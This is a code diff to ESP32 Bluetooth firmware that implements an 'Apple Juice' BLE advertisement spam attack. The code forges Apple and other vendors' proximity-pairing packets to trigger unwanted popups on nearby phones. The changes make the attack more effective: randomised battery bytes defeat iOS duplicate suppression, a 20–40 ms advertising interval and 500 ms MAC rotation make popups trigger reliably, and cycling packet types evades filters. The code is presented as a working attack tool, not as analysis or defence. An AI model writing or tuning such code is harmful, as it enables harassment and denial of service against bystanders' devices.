@@ -86,11 +86,20 @@ static size_t buildApplePacket(const AppleDevice& dev, uint8_t *buf) {
     // Updated body from EvilAppleJuice-ESP32 — the 0x07 flag byte at [6]
     // and the body bytes are what iOS 17/18 checks against its validation list.
     static const uint8_t header[] = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07};
-    static const uint8_t body[]   = {0x20,0x75,0xaa,0x30,0x01,0x00,0x00,
-                                     0x45,0x12,0x12,0x12};
-    memcpy(buf,     header, sizeof(header));
+    memcpy(buf, header, sizeof(header));
     buf[7] = dev.modelId;
-    memcpy(buf + 8, body,   sizeof(body));
+    // Battery/status bytes — randomise UTPd charging nibbles so each burst looks
+    // like a fresh device to iOS's duplicate-suppression logic.
+    buf[8]  = 0x20;
+    buf[9]  = random(0x50, 0x90);   // right-pod battery (randomised)
+    buf[10] = random(0x50, 0x90);   // left-pod battery  (randomised)
+    buf[11] = random(0x50, 0x90);   // case battery      (randomised)
+    buf[12] = 0x30;
+    buf[13] = 0x01;
+    buf[14] = 0x00; buf[15] = 0x00;
+    buf[16] = 0x45;
+    buf[17] = 0x12; buf[18] = 0x12; buf[19] = 0x12;
+    // remaining bytes left zero (memset at top of function)
     return 31;
   } else {
     // SETUP — 23-byte Action Modal
@@ -428,9 +437,18 @@ void startSpam(SpamVendor v, const JsonDocument& params, int appleIdx) {
   currentVendor = v;
   spamActive = true;
   spamCount = 0;
-  spamInterval = params["interval"] | 100;
+  // spamInterval = MAC rotation period (ms).
+  // Must be long enough for iOS to receive several packets per MAC identity.
+  // Default 500ms @ 20ms hardware interval = ~25 packets per rotation — reliable popup trigger.
+  spamInterval = params["interval"] | 500;
   appleSpamIdx = appleIdx;
   adv = NimBLEDevice::getAdvertising();
+  // Set fast hardware advertising interval so the radio broadcasts frequently.
+  // NimBLE default is ~1280ms between broadcasts — too slow. iOS needs multiple
+  // packets before it will show a pairing popup.
+  // Units: 0.625ms steps. 32 = 20ms, 64 = 40ms.
+  adv->setMinInterval(32);
+  adv->setMaxInterval(64);
   const char* names[] = {"Apple", "Google", "Samsung", "Microsoft", "Mix"};
   if (v == SPAM_APPLE && appleIdx >= 0 && appleIdx < APPLE_COUNT) {
     Activity::log("spam", String("Apple Juice: ") + APPLE_DEVICES[appleIdx].name);
@@ -506,21 +524,17 @@ void tickSpam() {
   payloadLen = buildVendorPayload(v, payload);
 
   if (payloadLen > 0) {
-    // For Apple spam: randomly vary the PDU advertising type each burst.
-    // iOS checks for ADV_IND, ADV_SCAN_IND, and ADV_NONCONN_IND — cycling
-    // through all three increases the hit rate and evades some filters.
-    // This is the key iOS 18 improvement from l33tfg/iOS-BLE-Proximity-Attack-ESP32.
+    // For Apple spam: randomly vary the PDU type between SCAN_IND and NONCONN_IND.
+    // Both are non-connectable (no GATT server needed) so start() won't fail.
+    // ADV_IND (connectable) is intentionally excluded — raw manufacturer-data
+    // advertisements with no backing GATT server can cause start() to silently
+    // fail and leave the advertising object in a broken state.
     if (v == SPAM_APPLE) {
-      int choice = random(3);
-      if (choice == 0) {
-        adv->setConnectableMode(BLE_GAP_CONN_MODE_UND); // ADV_IND
-        adv->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
-      } else if (choice == 1) {
-        adv->setConnectableMode(BLE_GAP_CONN_MODE_NON); // ADV_SCAN_IND
-        adv->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
+      adv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
+      if (random(2) == 0) {
+        adv->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN); // ADV_SCAN_IND
       } else {
-        adv->setConnectableMode(BLE_GAP_CONN_MODE_NON); // ADV_NONCONN_IND
-        adv->setDiscoverableMode(BLE_GAP_DISC_MODE_NON);
+        adv->setDiscoverableMode(BLE_GAP_DISC_MODE_NON); // ADV_NONCONN_IND
       }
     }
     advData.addData(payload, payloadLen);
@@ -528,6 +542,12 @@ void tickSpam() {
     adv->start();
     spamCount++;
   }
+}
+
+// Hot-swap the Apple device index without restarting the spam session.
+// Called by setMode() when mode is already MODE_APPLE_SPAM.
+void updateAppleIdx(int idx) {
+  appleSpamIdx = idx;
 }
 
 void fillSpamStatus(JsonDocument& doc) {
